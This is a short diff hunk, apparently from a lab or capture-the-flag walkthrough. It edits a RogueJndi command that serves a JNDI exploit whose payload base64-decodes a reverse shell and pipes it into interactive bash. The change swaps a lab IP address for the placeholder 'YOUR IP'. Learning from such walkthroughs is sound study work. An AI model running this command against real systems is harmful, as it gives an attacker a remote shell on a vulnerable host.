@@ -59,7 +59,7 @@ base64
 
 
 java -jar target/RogueJndi-1.1.jar --command "bash -c
-{echo,base64string from reverse shell}|{base64,-d}|{bash,-i}" --hostname "10.10.14.33"
+{echo,base64string from reverse shell}|{base64,-d}|{bash,-i}" --hostname "YOUR IP"
 
 
 
